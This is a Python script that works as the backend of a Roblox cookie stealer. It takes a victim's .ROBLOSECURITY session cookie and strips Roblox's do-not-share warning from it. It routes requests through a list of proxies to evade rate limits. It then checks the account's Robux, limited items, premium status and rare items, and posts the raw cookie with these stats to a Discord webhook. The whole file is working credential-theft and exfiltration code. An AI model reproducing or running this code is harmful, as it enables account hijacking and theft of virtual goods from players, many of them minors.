import sys
import os
import re
import time
import random
import requests
from datetime import datetime, timezone

# Your proxy list for Render bypass
RAW_PROXY_LIST = """
socks5://213.165.54.5:1080
socks4://46.8.104.176:1080
http://5.129.254.243:8888
http://5.129.254.49:8888
socks5://93.100.82.163:1080
socks5://80.79.241.118:1080
socks5://185.9.73.44:1080
socks5://46.161.49.174:10808
http://5.129.254.51:8888
http://5.129.254.154:8888
http://5.129.254.60:8888
http://147.45.164.178:8888
socks5://77.91.108.85:1080
http://5.129.254.129:8888
http://5.129.254.5:8888
socks5://217.69.222.174:1080
http://5.129.254.215:8888
socks5://83.234.87.145:1080
socks5://82.142.130.102:1080
http://20.52.234.254:3128
"""

SPECIAL_ASSETS = {
    "Korblox": 139607718,
    "Headless": 134082579,
    "Violet Valk": 1402432199,
}

GAMES = {
    "Adopt Me": 383310974,
    "MM2": 66654135,
    "PS99": 3317771874,
}

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""
    raw_str = str(raw_input).strip()
    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    cookie = ps_match.group(1) if ps_match else raw_str
    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
        cookie = cookie[1:-1].strip()
    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):].strip()
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if cookie.startswith(warning_text):
        cookie = cookie[len(warning_text):].strip()
    return cookie.lstrip('.').rstrip(';').strip()

def get_working_session(roblosecurity):
    session = requests.Session()
    if roblosecurity:
        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.roblox.com/",
        "Origin": "https://www.roblox.com/"
    })

    manual_proxy = os.environ.get('PROXY_URL')
    proxies_to_try = [manual_proxy] if manual_proxy else []
    parsed_proxies = [line.strip() for line in RAW_PROXY_LIST.strip().splitlines() if line.strip()]
    random.shuffle(parsed_proxies)
    proxies_to_try.extend(parsed_proxies)

    for p in proxies_to_try:
        if not p:
            continue
        proxy_dict = {"http": p, "https": p}
        try:
            session.proxies = proxy_dict
            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=3)
            if test_res.status_code != 429:
                return session, test_res
        except Exception:
            continue

    session.proxies = {}
    fallback_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
    return session, fallback_res

def api_get(session, url, **kwargs):
    try:
        r = session.get(url, timeout=4, **kwargs)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

def main():
    try:
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url or len(sys.argv) < 2:
            sys.exit(1)
        
        roblosecurity = extract_and_clean_cookie(sys.argv[1])
        session, auth_res = get_working_session(roblosecurity)
        
        user_id = None
        username = "Unknown User"
        display_name = "Unknown"
        age_days = 0
        robux = 0
        pending = 0
        rap = 0
        lim_count = 0
        premium = False
        games_data = {}
        special_owned = {}
        gamepasses_bought = 0

        if auth_res.status_code == 200:
            auth_data = auth_res.json()
            user_id = auth_data.get("id")
            if user_id:
                username = auth_data.get("name", "Unknown")
                display_name = auth_data.get("displayName", username)

                # 1. Quick account info & Currency
                user_info = api_get(session, f"https://users.roblox.com/v1/users/{user_id}")
                if user_info:
                    created = user_info.get("created", "")
                    if created:
                        try:
                            age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days
                        except Exception:
                            pass

                curr_res = api_get(session, "https://economy.roblox.com/v1/user/currency")
                if curr_res:
                    robux = curr_res.get("robux", 0)

                trans_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals", params={"timeFrame": "Month", "transactionType": "summary"})
                if trans_res:
                    pending = trans_res.get("pendingRobuxTotal", 0)

                prem_res = api_get(session, f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
                if isinstance(prem_res, bool):
                    premium = prem_res
                elif isinstance(prem_res, dict):
                    premium = prem_res.get("isMember", False)

                # 2. Collectibles (Capped to first 100 items for instant load)
                collectibles_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params={"limit": 100, "sortOrder": "Asc"})
                if collectibles_res and "data" in collectibles_res:
                    collectibles = collectibles_res["data"]
                    lim_count = len(collectibles)
                    rap = sum(c.get("recentAveragePrice", 0) or 0 for c in collectibles)
                else:
                    lim_count = "Private"
                    rap = "Private"

                # 3. Total gamepasses bought (quick single-page check)
                try:
                    t_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transactions", params={"transactionType": "Purchase", "limit": 50})
                    if t_res and "data" in t_res:
                        for item in t_res["data"]:
                            details = item.get("details")
                            if details and details.get("type") == "GamePass":
                                gamepasses_bought += 1
                except Exception:
                    pass

                # 4. Special items check
                for item_name, asset_id in SPECIAL_ASSETS.items():
                    asset_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}")
                    special_owned[item_name] = bool(asset_res and asset_res.get("data"))

                # 5. Fast game played check using recent badges
                for game_name, universe_id in GAMES.items():
                    played = False
                    b_res = api_get(session, f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 100})
                    if b_res and "data" in b_res:
                        for badge in b_res["data"]:
                            if badge.get("awardingUniverse", {}).get("id") == universe_id:
                                played = True
                                break
                    games_data[game_name] = {"played": played, "passes": 0}

        # Safe formatting
        robux_display = f"{robux:,}" if isinstance(robux, int) else str(robux)
        pending_display = f"{pending:,}" if isinstance(pending, int) else str(pending)
        rap_display = f"{rap:,}" if isinstance(rap, int) else str(rap)

        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
        
        games_str = "\n".join([f"- {g}: {d['played']} ({d['passes']})" for g, d in games_data.items()]) if games_data else "N/A"
        special_str = "\n".join([f"+ {name}: {owned}" for name, owned in special_owned.items()]) if special_owned else "N/A"

        embed_stats = {
            "title": "📢 Discord Notification 📢",
            "description": f"```ini\n[ ⚡ Stats ] • [ 🌐 Profile ]\n```\n🔗 **[Stats Link](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**",
            "color": 0x2B2D31,
            "thumbnail": {"url": avatar_url},
            "fields": [
                {"name": "🐱 Username", "value": f"```ini\n{username}\n```", "inline": False},
                {"name": "📊 Account Stats", "value": f"```diff\n+ Account Age: {age_days} Days\n+ Total Passes Bought: {gamepasses_bought}\n+ Premium: {premium}\n```", "inline": False},
                {"name": "🪙 Robux", "value": f"```ini\nBalance: {robux_display}\nPending: {pending_display}\n```", "inline": True},
                {"name": "💎 Limiteds", "value": f"```ini\nRAP: {rap_display}\nLimiteds: {lim_count}\n```", "inline": True},
                {"name": "👑 Special Items", "value": f"```diff\n{special_str}\n```", "inline": False},
                {"name": "⭐ Games", "value": f"```diff\n{games_str}\n```", "inline": False}
            ],
            "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        embed_cookie = {
            "title": "🍪 Session Cookie Data",
            "description": f"```text\n{roblosecurity}\n```",
            "color": 0x2B2D31,
            "footer": {"text": f"Token Length: {len(roblosecurity)} chars"}
        }

        payload = {
            "content": "@everyone",
            "username": f"{display_name} | Stats",
            "avatar_url": avatar_url,
            "embeds": [embed_stats, embed_cookie],
            "allowed_mentions": {
                "parse": ["everyone"]
            }
        }

        requests.post(webhook_url, json=payload, timeout=5)

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
